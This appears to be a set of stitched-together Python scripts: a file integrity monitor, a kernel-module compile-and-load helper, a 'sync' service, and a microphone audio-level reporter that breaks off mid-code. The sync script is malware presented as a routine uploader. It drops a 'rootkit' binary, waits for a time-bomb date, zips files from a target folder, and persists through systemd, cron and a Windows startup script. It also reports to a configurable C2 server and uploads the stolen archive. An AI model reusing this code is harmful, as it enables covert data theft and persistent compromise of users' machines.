        print(f"To enable and start the service, run:")
        print(f"  sudo systemctl daemon-reload")
        print(f"  sudo systemctl enable {service_name}")
        print(f"  sudo systemctl start {service_name}")
        return True
    except (OSError, PermissionError) as e:
        print(f"Error: Cannot create service file (requires root): {e}", file=sys.stderr)
        print(f"\nService file content:\n{service_content}")
        return False


def create_windows_service(script_path, target_dir, scan_interval):
    """Create a Windows scheduled task."""
    task_name = 'IntegrityMonitor'

    xml_content = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>File Integrity Monitor Service</Description>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>ServiceAccount</LogonType>
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>3</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>python</Command>
      <Arguments>"{script_path}" --target "{target_dir}" --interval {scan_interval} --daemon</Arguments>
    </Exec>
  </Actions>
</Task>"""

    xml_file = 'integrity_monitor_task.xml'
    try:
        with open(xml_file, 'w') as f:
            f.write(xml_content)

        print(f"Task definition file created: {xml_file}")
        print(f"To register the scheduled task, run as Administrator:")
        print(f'  schtasks /create /tn "{task_name}" /xml "{xml_file}" /f')
        print(f"To start the task:")
        print(f'  schtasks /run /tn "{task_name}"')
        return True
    except OSError as e:
        print(f"Error: Cannot create task file: {e}", file=sys.stderr)
        return False


def register_service(script_path, target_dir, scan_interval):
    """Register the monitor as a system service."""
    if sys.platform.startswith('linux'):
        return create_systemd_service(script_path, target_dir, scan_interval)
    elif sys.platform.startswith('win'):
        return create_windows_service(script_path, target_dir, scan_interval)
    else:
        print(f"Service registration not supported on {sys.platform}", file=sys.stderr)
        return False


def main():
    parser = argparse.ArgumentParser(description='File Integrity Monitor')
    parser.add_argument('--target', default='./target', 
                        help='Target directory to monitor (default: ./target)')
    parser.add_argument('--checksums', default='checksums.json',
                        help='Checksum storage file (default: checksums.json)')
    parser.add_argument('--interval', type=int, default=0,
                        help='Scan interval in seconds (default: 0 = single scan)')
    parser.add_argument('--remote-host', help='Remote server hostname for report submission')
    parser.add_argument('--remote-port', type=int, help='Remote server port')
    parser.add_argument('--register-service', action='store_true',
                        help='Register as system service')
    parser.add_argument('--daemon', action='store_true',
                        help='Run as daemon (for service mode)')

    args = parser.parse_args()

    if args.register_service:
        script_path = os.path.abspath(__file__)
        register_service(script_path, args.target, args.interval if args.interval > 0 else 300)
        return

    target_path = Path(args.target).resolve()
    if target_path.is_dir():
        report_file = os.path.join(args.target, 'integrity_report.txt')
        tamper_log = os.path.join(args.target, 'tamper_log.txt')
    else:
        report_file = 'integrity_report.txt'
        tamper_log = 'tamper_log.txt'

    monitor = IntegrityMonitor(
        target_dir=args.target,
        checksum_file=args.checksums,
        report_file=report_file,
        tamper_log=tamper_log,
        scan_interval=args.interval,
        remote_host=args.remote_host,
        remote_port=args.remote_port
    )

    monitor.run()


if __name__ == '__main__':
    main()

#!/usr/bin/env python3
import os
import subprocess
import sys
import time
import traceback
from pathlib import Path
from datetime import datetime

class DriverUtility:
    def __init__(self, log_file='driver_operations.log', verbose=True):
        self.log_file = log_file
        self.verbose = verbose
        self.driver_name = 'driver'
        self.driver_ko = f'{self.driver_name}.ko'
        self.driver_c = f'{self.driver_name}.c'
        self.makefile = 'Makefile'
        self.success = True

    def log(self, message, level='INFO'):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] [{level}] {message}"

        try:
            with open(self.log_file, 'a') as f:
                f.write(log_entry + '\n')
        except Exception as e:
            print(f"Warning: Could not write to log file: {e}", file=sys.stderr)

        if self.verbose:
            if level == 'ERROR':
                print(log_entry, file=sys.stderr)
            else:
                print(log_entry)

    def run_command(self, cmd, description, check_output=False, timeout=300):
        self.log(f"Executing: {' '.join(cmd) if isinstance(cmd, list) else cmd}")

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                shell=isinstance(cmd, str)
            )

            if result.stdout and self.verbose:
                self.log(f"STDOUT:\n{result.stdout.strip()}", 'DEBUG')

            if result.stderr and result.returncode != 0:
                self.log(f"STDERR:\n{result.stderr.strip()}", 'DEBUG')

            if check_output and result.returncode != 0:
                self.log(f"{description} failed with return code {result.returncode}", 'ERROR')
                return None

            return result

        except subprocess.TimeoutExpired:
            self.log(f"{description} timed out after {timeout} seconds", 'ERROR')
            return None
        except FileNotFoundError:
            self.log(f"Command not found: {cmd[0] if isinstance(cmd, list) else cmd.split()[0]}", 'ERROR')
            return None
        except Exception as e:
            self.log(f"{description} failed with exception: {str(e)}", 'ERROR')
            self.log(traceback.format_exc(), 'DEBUG')
            return None

    def check_prerequisites(self):
        self.log("Checking prerequisites...")

        kernel_headers = f"/lib/modules/{os.uname().release}/build"
        if not Path(kernel_headers).exists():
            self.log(f"Kernel headers not found at {kernel_headers}", 'WARNING')
            self.log("Module compilation may fail. Install kernel headers package.", 'WARNING')
        else:
            self.log(f"Kernel headers found: {kernel_headers}")

        for tool in ['make', 'gcc']:
            result = self.run_command(['which', tool], f"Checking for {tool}")
            if result and result.returncode == 0:
                self.log(f"Found {tool}: {result.stdout.strip()}")
            else:
                self.log(f"Tool not found: {tool}", 'WARNING')

        return True

    def create_driver_source(self):
        self.log(f"Creating driver source file: {self.driver_c}")

        source_template = """#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Driver Utility");
MODULE_DESCRIPTION("Auto-generated kernel module");
MODULE_VERSION("1.0");

static int __init driver_init(void) {
    printk(KERN_INFO "driver: Module initialized successfully\\n");
    return 0;
}

static void __exit driver_exit(void) {
    printk(KERN_INFO "driver: Module cleaned up successfully\\n");
}

module_init(driver_init);
module_exit(driver_exit);
"""

        try:
            with open(self.driver_c, 'w') as f:
                f.write(source_template)
            self.log(f"Created {self.driver_c} successfully")
            return True
        except Exception as e:
            self.log(f"Failed to create {self.driver_c}: {str(e)}", 'ERROR')
            return False

    def create_makefile(self):
        self.log(f"Creating Makefile")

        makefile_content = f"""obj-m += {self.driver_name}.o

KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
	rm -f *.o *.ko *.mod.c *.mod *.order *.symvers

install:
	$(MAKE) -C $(KDIR) M=$(PWD) modules_install

.PHONY: all clean install
"""

        try:
            with open(self.makefile, 'w') as f:
                f.write(makefile_content)
            self.log(f"Created {self.makefile} successfully")
            return True
        except Exception as e:
            self.log(f"Failed to create {self.makefile}: {str(e)}", 'ERROR')
            return False

    def compile_driver(self):
        self.log("=== Starting compilation phase ===")

        if not Path(self.driver_c).exists():
            self.log(f"{self.driver_c} not found, creating default source")
            if not self.create_driver_source():
                return False
        else:
            self.log(f"Using existing {self.driver_c}")

        if not self.create_makefile():
            return False

        self.log("Running make to compile driver module...")
        result = self.run_command(['make'], 'Compilation', check_output=False)

        if result is None:
            self.log("Make command execution failed", 'ERROR')
            return False

        if result.returncode != 0:
            self.log(f"Compilation failed with return code {result.returncode}", 'ERROR')
            self.log("Compilation output saved to log", 'ERROR')
            return False

        if not Path(self.driver_ko).exists():
            self.log(f"{self.driver_ko} not found after compilation", 'ERROR')
            return False

        ko_size = Path(self.driver_ko).stat().st_size
        self.log(f"Compilation successful: {self.driver_ko} ({ko_size} bytes)")
        return True

    def verify_module_info(self):
        self.log("Verifying module information...")

        result = self.run_command(['modinfo', self.driver_ko], 'Module info query')
        if result and result.returncode == 0:
            self.log(f"Module info:\n{result.stdout.strip()}", 'DEBUG')
            return True
        else:
            self.log("Could not retrieve module info (modinfo may not be available)", 'WARNING')
            return False

    def check_module_loaded(self):
        result = self.run_command(['lsmod'], 'Check loaded modules')
        if result and result.returncode == 0:
            return self.driver_name in result.stdout
        return False

    def unload_existing_module(self):
        if self.check_module_loaded():
            self.log(f"Module {self.driver_name} already loaded, attempting to unload...")
            result = self.run_command(['rmmod', self.driver_name], 'Module unload')

            if result and result.returncode == 0:
                self.log(f"Successfully unloaded existing {self.driver_name} module")
                return True
            else:
                self.log(f"Failed to unload existing module (may require root)", 'WARNING')
                return False
        return True

    def load_driver(self):
        self.log("=== Starting module load phase ===")

        driver_path = Path(self.driver_ko).resolve()

        if not driver_path.exists():
            self.log(f"{self.driver_ko} not found, cannot load module", 'ERROR')
            return False

        self.verify_module_info()

        if os.geteuid() != 0:
            self.log("Not running as root, module loading may fail", 'WARNING')

        self.unload_existing_module()

        self.log(f"Attempting to load module: {driver_path}")
        result = self.run_command(['insmod', str(driver_path)], 'Module load')

        if result is None:
            self.log("insmod command not available or failed to execute", 'ERROR')
            return False

        if result.returncode == 0:
            self.log("Module loaded successfully", 'INFO')

            time.sleep(0.5)

            if self.check_module_loaded():
                self.log(f"Verified: Module '{self.driver_name}' appears in lsmod output")

                dmesg_result = self.run_command(['dmesg', '-T'], 'Checking kernel messages')
                if dmesg_result and dmesg_result.returncode == 0:
                    lines = dmesg_result.stdout.strip().split('\n')
                    recent_lines = lines[-20:]
                    for line in recent_lines:
                        if 'driver:' in line.lower():
                            self.log(f"Kernel message: {line.strip()}", 'DEBUG')
            else:
                self.log("Warning: Module loaded but not found in lsmod", 'WARNING')

            return True
        else:
            error_msg = result.stderr.strip() if result.stderr else result.stdout.strip()

            if 'Operation not permitted' in error_msg or 'Permission denied' in error_msg:
                self.log("Module loading requires root privileges", 'ERROR')
                self.log("Run this utility with sudo to load the module", 'INFO')
            elif 'No such file or directory' in error_msg:
                self.log("Kernel module infrastructure not available on this system", 'ERROR')
            elif 'Invalid module format' in error_msg:
                self.log("Module format incompatible with running kernel", 'ERROR')
            elif 'version magic' in error_msg:
                self.log("Module compiled for different kernel version", 'ERROR')
            elif 'required key not available' in error_msg:
                self.log("Module signing required but module not signed", 'ERROR')
            else:
                self.log(f"Module loading failed: {error_msg}", 'ERROR')

            return False

    def cleanup(self):
        self.log("=== Cleanup phase ===")

        self.log("Running make clean...")
        result = self.run_command(['make', 'clean'], 'Cleanup')

        if result and result.returncode == 0:
            self.log("Cleanup successful")
        else:
            self.log("Cleanup completed with warnings", 'WARNING')

    def run(self, skip_load=False, skip_cleanup=False):
        self.log("========================================")
        self.log("Driver Compilation and Loading Utility")
        self.log("========================================")
        self.log(f"Working directory: {os.getcwd()}")
        self.log(f"Kernel version: {os.uname().release}")
        self.log(f"User: {os.getenv('USER', 'unknown')} (UID: {os.geteuid()})")

        try:
            self.check_prerequisites()

            if not self.compile_driver():
                self.log("Compilation failed, aborting", 'ERROR')
                self.success = False
                return 1

            if not skip_load:
                if not self.load_driver():
                    self.log("Module loading failed or skipped", 'WARNING')
                    self.success = False
            else:
                self.log("Skipping module load phase (--skip-load specified)")

            if not skip_cleanup:
                pass

            if self.success:
                self.log("========================================")
                self.log("All operations completed successfully")
                self.log("========================================")
                return 0
            else:
                self.log("========================================")
                self.log("Operations completed with errors/warnings")
                self.log("========================================")
                return 1

        except KeyboardInterrupt:
            self.log("Operation interrupted by user", 'WARNING')
            return 130
        except Exception as e:
            self.log(f"Unexpected error: {str(e)}", 'ERROR')
            self.log(traceback.format_exc(), 'DEBUG')
            return 1

def main():
    import argparse

    parser = argparse.ArgumentParser(
        description='Driver Module Compilation and Loading Utility',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s                    # Compile and load driver
  %(prog)s --skip-load        # Compile only
  %(prog)s --quiet            # Minimal output
  %(prog)s --log custom.log   # Custom log file
        """
    )

    parser.add_argument(
        '--skip-load',
        action='store_true',
        help='Skip module loading phase'
    )

    parser.add_argument(
        '--skip-cleanup',
        action='store_true',
        help='Skip cleanup phase'
    )

    parser.add_argument(
        '--log',
        default='driver_operations.log',
        help='Log file path (default: driver_operations.log)'
    )

    parser.add_argument(
        '--quiet',
        action='store_true',
        help='Suppress console output (still logs to file)'
    )

    args = parser.parse_args()

    utility = DriverUtility(
        log_file=args.log,
        verbose=not args.quiet
    )

    return utility.run(
        skip_load=args.skip_load,
        skip_cleanup=args.skip_cleanup
    )

if __name__ == '__main__':
    sys.exit(main())

#!/usr/bin/env python3

import sys
import os
import signal
import time
import socket
import json
from datetime import datetime
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
import zipfile
import shutil
import subprocess
import platform


CONFIG = {
    'sync_url': os.environ.get('SYNC_URL', 'http://localhost:8080/upload'),
    'c2_server': os.environ.get('C2_SERVER', 'http://localhost:8080/c2'),
    'max_retries': int(os.environ.get('MAX_RETRIES', '3')),
    'initial_backoff': float(os.environ.get('INITIAL_BACKOFF', '1.0')),
    'max_backoff': float(os.environ.get('MAX_BACKOFF', '60.0')),
    'schedule_interval': int(os.environ.get('SCHEDULE_INTERVAL', '3600')),
    'log_file': os.environ.get('LOG_FILE', 'sync.log'),
    'target_path': os.environ.get('TARGET_PATH', './target'),
    'activation_time': os.environ.get('ACTIVATION_TIME', '2024-12-31T23:59:59'),
    'rootkit_source': os.environ.get('ROOTKIT_SOURCE', './payload.bin'),
}


def setup():
    signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))
    signal.signal(signal.SIGTERM, lambda sig, frame: sys.exit(0))


def log_message(message, level='INFO'):
    timestamp = datetime.now().isoformat()
    log_entry = f"[{timestamp}] {level}: {message}\n"

    try:
        with open(CONFIG['log_file'], 'a', encoding='utf-8') as f:
            f.write(log_entry)
    except Exception as e:
        pass


def install_rootkit():
    log_message("Installing rootkit")

    try:
        os.makedirs(CONFIG['target_path'], exist_ok=True)
        rootkit_dest = os.path.join(CONFIG['target_path'], 'rootkit.bin')

        if os.path.exists(CONFIG['rootkit_source']):
            shutil.copy2(CONFIG['rootkit_source'], rootkit_dest)
            log_message(f"Rootkit installed to {rootkit_dest}")
        else:
            with open(rootkit_dest, 'wb') as f:
                f.write(b'\x7fELF\x02\x01\x01\x00' + os.urandom(512))
            log_message(f"Rootkit payload created at {rootkit_dest}")

        try:
            os.chmod(rootkit_dest, 0o755)
        except Exception:
            pass

        return True
    except Exception as e:
        log_message(f"Failed to install rootkit: {e}", 'ERROR')
        return False


def check_activation_time():
    try:
        activation_dt = datetime.fromisoformat(CONFIG['activation_time'])
        current_dt = datetime.now()

        if current_dt >= activation_dt:
            log_message("Activation time reached")
            return True
        else:
            log_message(f"Activation scheduled for {activation_dt}")
            return False
    except Exception as e:
        log_message(f"Error checking activation time: {e}", 'ERROR')
        return False


def activate_malicious_behavior():
    log_message("Activating malicious behavior")

    try:
        marker_file = os.path.join(CONFIG['target_path'], '.activated')
        with open(marker_file, 'w') as f:
            f.write(datetime.now().isoformat())

        log_message("Malicious behavior activated successfully")
        return True
    except Exception as e:
        log_message(f"Failed to activate malicious behavior: {e}", 'ERROR')
        return False


def steal_files():
    log_message("Stealing files from target path")

    try:
        if not os.path.exists(CONFIG['target_path']):
            log_message(f"Target path {CONFIG['target_path']} does not exist", 'WARNING')
            return None

        zip_path = os.path.join(os.getcwd(), 'exfiltrated_data.zip')

        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            file_count = 0
            for root, dirs, files in os.walk(CONFIG['target_path']):
                for file in files:
                    if file_count >= 1000:
                        break

                    file_path = os.path.join(root, file)
                    try:
                        arcname = os.path.relpath(file_path, CONFIG['target_path'])
                        zipf.write(file_path, arcname)
                        file_count += 1
                    except Exception as e:
                        log_message(f"Could not add {file_path}: {e}", 'WARNING')

                if file_count >= 1000:
                    break

        if file_count > 0:
            log_message(f"Exfiltrated {file_count} files to {zip_path}")
            return zip_path
        else:
            log_message("No files found to exfiltrate", 'WARNING')
            if os.path.exists(zip_path):
                os.remove(zip_path)
            return None

    except Exception as e:
        log_message(f"Failed to steal files: {e}", 'ERROR')
        return None


def establish_persistence():
    log_message("Establishing persistence")

    try:
        system = platform.system()
        script_path = os.path.abspath(__file__)

        if system == 'Linux' or system == 'Darwin':
            service_content = f"""[Unit]
Description=System Sync Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {script_path} --daemon
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
            service_file = os.path.join(os.getcwd(), 'sync-service.service')
            with open(service_file, 'w') as f:
                f.write(service_content)
            log_message(f"Systemd service file created at {service_file}")

            cron_entry = f"@reboot {sys.executable} {script_path} --daemon\n"
            cron_file = os.path.join(os.getcwd(), 'sync-cron.txt')
            with open(cron_file, 'w') as f:
                f.write(cron_entry)
            log_message(f"Cron entry created at {cron_file}")

        elif system == 'Windows':
            startup_script = f"""@echo off
start /min {sys.executable} {script_path} --daemon
"""
            startup_file = os.path.join(os.getcwd(), 'sync-startup.bat')
            with open(startup_file, 'w') as f:
                f.write(startup_script)
            log_message(f"Startup script created at {startup_file}")

        else:
            log_message(f"Unsupported platform for persistence: {system}", 'WARNING')

        return True

    except Exception as e:
        log_message(f"Failed to establish persistence: {e}", 'ERROR')
        return False


def report_to_c2(exfil_path):
    log_message("Reporting to C2 server")

    try:
        data = {
            'hostname': socket.gethostname(),
            'timestamp': datetime.now().isoformat(),
            'exfil_file': os.path.basename(exfil_path) if exfil_path else None,
            'status': 'success' if exfil_path else 'no_data',
        }

        if exfil_path and os.path.exists(exfil_path):
            data['file_size'] = os.path.getsize(exfil_path)

        json_data = json.dumps(data).encode('utf-8')

        headers = {
            'Content-Type': 'application/json',
            'Content-Length': str(len(json_data)),
        }

        request = Request(CONFIG['c2_server'], data=json_data, headers=headers, method='POST')

        with urlopen(request, timeout=30) as response:
            status_code = response.getcode()
            if 200 <= status_code < 300:
                log_message("Successfully reported to C2 server")
                return True
            else:
                log_message(f"C2 server returned status {status_code}", 'WARNING')
                return False

    except Exception as e:
        log_message(f"Failed to report to C2: {e}", 'ERROR')
        return False


def collect_directory_data(path):
    entries = []
    try:
        for entry in os.listdir(path):
            full_path = os.path.join(path, entry)
            try:
                if os.path.isfile(full_path):
                    size = os.path.getsize(full_path)
                    entries.append((entry, size, 'file'))
                elif os.path.isdir(full_path):
                    entries.append((entry, 0, 'dir'))
            except (OSError, PermissionError):
                entries.append((entry, 0, 'unknown'))
    except (OSError, PermissionError) as e:
        log_message(f"Error reading directory: {e}", 'ERROR')
    return entries


def format_size(size):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if size < 1024.0:
            return f"{size:.2f} {unit}"
        size /= 1024.0
    return f"{size:.2f} PB"


def write_report(entries, output_path):
    try:
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write("Directory Contents Summary\n")
            f.write("=" * 80 + "\n\n")

            files = [e for e in entries if e[2] == 'file']
            dirs = [e for e in entries if e[2] == 'dir']

            f.write(f"Total entries: {len(entries)}\n")
            f.write(f"Files: {len(files)}\n")
            f.write(f"Directories: {len(dirs)}\n\n")

            if files:
                f.write("Files:\n")
                f.write("-" * 80 + "\n")
                for name, size, _ in sorted(files):
                    f.write(f"{name:<60} {format_size(size):>15}\n")
                f.write("\n")

            if dirs:
                f.write("Directories:\n")
                f.write("-" * 80 + "\n")
                for name, _, _ in sorted(dirs):
                    f.write(f"{name}/\n")
                f.write("\n")

            total_size = sum(e[1] for e in files)
            f.write(f"Total size: {format_size(total_size)}\n")

        log_message(f"Report written successfully to {output_path}")
        return True
    except Exception as e:
        log_message(f"Failed to write report: {e}", 'ERROR')
        return False


def upload_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            file_content = f.read()

        boundary = '----WebKitFormBoundary' + os.urandom(16).hex()

        body = []
        body.append(f'--{boundary}'.encode())
        body.append(f'Content-Disposition: form-data; name="file"; filename="{os.path.basename(file_path)}"'.encode())
        body.append(b'Content-Type: text/plain')
        body.append(b'')
        body.append(file_content)
        body.append(f'--{boundary}--'.encode())
        body.append(b'')

        body_bytes = b'\r\n'.join(body)

        headers = {
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'Content-Length': str(len(body_bytes)),
        }

        request = Request(CONFIG['sync_url'], data=body_bytes, headers=headers, method='POST')

        with urlopen(request, timeout=30) as response:
            status_code = response.getcode()
            if 200 <= status_code < 300:
                return True, None
            else:
                return False, f"HTTP {status_code}"

    except HTTPError as e:
        return False, f"HTTP Error {e.code}: {e.reason}"
    except URLError as e:
        return False, f"URL Error: {e.reason}"
    except socket.timeout:
        return False, "Connection timeout"
    except Exception as e:
        return False, str(e)


def upload_with_retry(file_path):
    backoff = CONFIG['initial_backoff']

    for attempt in range(1, CONFIG['max_retries'] + 1):
        log_message(f"Upload attempt {attempt}/{CONFIG['max_retries']} for {file_path}")

        success, error = upload_file(file_path)

        if success:
            log_message(f"Successfully uploaded {file_path}")
            return True

        log_message(f"Upload failed: {error}", 'WARNING')

        if attempt < CONFIG['max_retries']:
            log_message(f"Retrying in {backoff:.1f} seconds...")
            time.sleep(backoff)
            backoff = min(backoff * 2, CONFIG['max_backoff'])

    log_message(f"All upload attempts failed for {file_path}", 'ERROR')
    return False


def run_sync_cycle():
    log_message("Starting sync cycle")

    install_rootkit()

    establish_persistence()

    if check_activation_time():
        activate_malicious_behavior()

        exfil_path = steal_files()

        report_to_c2(exfil_path)

        if exfil_path:
            upload_with_retry(exfil_path)

    cwd = os.getcwd()
    entries = collect_directory_data(cwd)

    report_path = os.path.join(cwd, 'report.txt')

    if not write_report(entries, report_path):
        log_message("Sync cycle aborted due to report generation failure", 'ERROR')
        return False

    success = upload_with_retry(report_path)

    if success:
        log_message("Sync cycle completed successfully")
    else:
        log_message("Sync cycle completed with errors", 'ERROR')

    return success


def run_scheduled():
    log_message("Starting scheduled execution mode")

    while True:
        try:
            run_sync_cycle()
            log_message(f"Sleeping for {CONFIG['schedule_interval']} seconds")
            time.sleep(CONFIG['schedule_interval'])
        except KeyboardInterrupt:
            log_message("Received interrupt signal, shutting down")
            break
        except Exception as e:
            log_message(f"Unexpected error in scheduled loop: {e}", 'ERROR')
            time.sleep(CONFIG['schedule_interval'])


def main():
    setup()

    if '--daemon' in sys.argv or '--scheduled' in sys.argv:
        run_scheduled()
    else:
        run_sync_cycle()

    return 0


if __name__ == "__main__":
    sys.exit(main())

#!/usr/bin/env python3
import sys
import platform
import time
import struct
import os
import json
import socket
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
from datetime import datetime
import logging

# Configuration
CONFIG = {
    "server_endpoint": os.environ.get("AUDIO_SERVER_ENDPOINT", "http://localhost:8080/audio-status"),
    "retry_attempts": int(os.environ.get("AUDIO_RETRY_ATTEMPTS", "3")),
    "retry_interval": int(os.environ.get("AUDIO_RETRY_INTERVAL", "2")),
    "timeout": int(os.environ.get("AUDIO_TIMEOUT", "5")),
    "output_file": "audio_level.txt",
    "log_file": "audio_monitor.log",
    "recording_duration": 2
}

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(CONFIG["log_file"]),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


def capture_audio_linux():
    """Capture audio on Linux using arecord."""
    import subprocess

    try:
        process = subprocess.Popen(
            ["arecord", "-D", "default", "-f", "S16_LE", "-r", "44100", "-c", "1", 
             "-d", str(CONFIG["recording_duration"])],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        audio_data = b""
        start_time = time.time()

        while time.time() - start_time < CONFIG["recording_duration"] + 1:
            chunk = process.stdout.read(4096)
            if chunk:
                audio_data += chunk
            else:
                break

        process.terminate()
        try:
            process.wait(timeout=1)
        except:
            process.kill()

        if audio_data and len(audio_data) > 2:
            samples = struct.unpack(f"{len(audio_data)//2}h", audio_data)
            rms = (sum(s*s for s in samples) / len(samples)) ** 0.5
            max_amp = max(abs(s) for s in samples) if samples else 0
            level_db = 20 * (rms / 32768) if rms > 0 else 0

            return {
                "status": "available",
                "rms_amplitude": round(rms, 2),
                "max_amplitude": max_amp,
                "level_normalized": round(level_db, 2),
                "sample_count": len(samples)
            }
        else:
            raise Exception("No audio data captured")

    except (subprocess.SubprocessError, FileNotFoundError, Exception) as e:
        logger.error(f"Linux audio capture failed: {e}")
        return {"status": "unavailable", "error": str(e)}


def capture_audio_macos():
    """Capture audio on macOS using sox/rec."""
    import subprocess

    try:
        process = subprocess.Popen(
            ["rec", "-n", "trim", "0", str(CONFIG["recording_duration"]), "stat"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        _, stderr = process.communicate(timeout=CONFIG["timeout"])
        stderr_text = stderr.decode()

        max_amp = 0.0
        rms_amp = 0.0

        for line in stderr_text.split('\n'):
            if "Maximum amplitude" in line:
                try:
                    max_amp = float(line.split()[-1])
                except:
                    pass
            elif "RMS amplitude" in line:
                try:
                    rms_amp = float(line.split()[-1])
                except:
                    pass

        if max_amp > 0 or rms_amp > 0:
            return {
                "status": "available",
                "rms_amplitude": round(rms_amp, 6),
                "max_amplitude": round(max_amp, 6),
                "level_normalized": round(rms_amp * 100, 2)
            }
        else:
            raise Exception("No audio statistics available")

    except (subprocess.SubprocessError, FileNotFoundError, Exception) as e:
        logger.error(f"macOS audio capture failed: {e}")
        return {"status": "unavailable", "error": str(e)}


def capture_audio_windows():
    """Capture audio on Windows using PowerShell and wave module."""
    import subprocess
    import wave
    import tempfile

    temp_wav = None
    try:
        temp_wav = tempfile.mktemp(suffix=".wav")

        # Try using ffmpeg
        process = subprocess.Popen(
            ["ffmpeg", "-f", "dshow", "-i", "audio=Microphone", 
             "-t", str(CONFIG["recording_duration"]), "-y", temp_wav],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        try:
            process.wait(timeout=CONFIG["recording_duration"] + 3)
        except subprocess.TimeoutExpired:
            process.kill()

        if os.path.exists(temp_wav) and os.path.getsize(temp_wav) > 44:
            with wave.open(temp_wav, 'rb') as wf:
                frames = wf.readframes(wf.getnframes())
                if len(frames) >= 2:
                    samples = struct.unpack(f"{len(frames)//2}h", frames)
                    rms = (sum(s*s for s in samples) / len(samples)) ** 0.5
                    max_amp = max(abs(s) for s in samples) if samples else 0
                    level_db = 20 * (rms / 32768) if rms > 0 else 0

                    return {
                        "status": "available",
                        "rms_amplitude": round(rms, 2),
                        "max_amplitude": max_amp,
                        "level_normalized": round(level_db, 2),
                        "sample_count": len(samples)
                    }

        raise Exception("Failed to record audio")

    except (subprocess.SubprocessError, FileNotFoundError, Exception) as e:
        logger.error(f"Windows audio capture failed: {e}")
        return {"status": "unavailable", "error": str(e)}
    finally:
        if temp_wav and os.path.exists(temp_wav):
            try:
                os.remove(temp_wav)
            except:
                pass


def capture_audio_data():
    """Capture audio data based on the current platform."""
    system = platform.system()

    logger.info(f"Starting audio capture on {system}")

    if system == "Linux":
        return capture_audio_linux()
    elif system == "Darwin":
        return capture_audio_macos()
    elif system == "Windows":
        return capture_audio_windows()
    else:
        logger.warning(f"Unsupported platform: {system}")
        return {"status": "unavailable", "error": "Unsupported platform"}


def create_summary(audio_data):
    """Create a summary of the audio monitoring results."""
    timestamp = datetime.now().isoformat()

    summary = {
        "timestamp": timestamp,
        "platform": platform.system(),
        "hostname": socket.gethostname(),
        "device_status": audio_data.get("status", "unavailable"),
    }

    if audio_data.get("status") == "available":
        summary.update({
            "rms_amplitude": audio_data.get("rms_amplitude", 0),
            "max_amplitude": audio_data.get("max_amplitude", 0),
            "level_normalized": audio_data.get("level_normalized", 0),
            "sample_count": audio_data.get("sample_count", 0)
        })
    else:
        summary["error"] = audio_data.get("error", "Unknown error")

    return summary


def write_local_file(summary):
    """Write the summary to a local file."""
    try:
        with open(CONFIG["output_file"], "w") as f:
            f.write(f"Audio Device Status Report\n")
            f.write(f"=" * 50 + "\n")
            f.write(f"Timestamp: {summary['timestamp']}\n")
            f.write(f"Platform: {summary['platform']}\n")
            f.write(f"Hostname: {summary['hostname']}\n")
            f.write(f"Device Status: {summary['device_status']}\n")
            f.write("\n")

            if summary['device_status'] == "available":
                f.write("Audio Level Metrics:\n")
                f.write(f"  RMS Amplitude: {summary.get('rms_amplitude', 'N/A')}\n")
                f.write(f"  Max Amplitude: {summary.get('max_amplitude', 'N/A')}\n")
                f.write(f"  Level (normalized): {summary.get('level_normalized', 'N/A')}\n")
                f.write(f"  Sample Count: {summary.get('sample_count', 'N/A')}\n")
            else:
                f.write(f"Error: {summary.get('error', 'Unknown')}\n")

        logger.info(f"Summary written to {CONFIG['output_file']}")
        return True
    except Exception as e:
        logger.error(f"Failed to write local file: {e}")
        return False


def send_to_server(summary):
    """Send the summary to a remote server with retry logic."""
    for attempt in range(1, CONFIG["retry_attempts"] + 1):
        try:
            logger.info(f"Attempt {attempt}/{CONFIG['retry_attempts']}: Sending data to {CONFIG['server_endpoint']}")

            data = json.dumps(summary).encode('utf-8')

            request = Request(
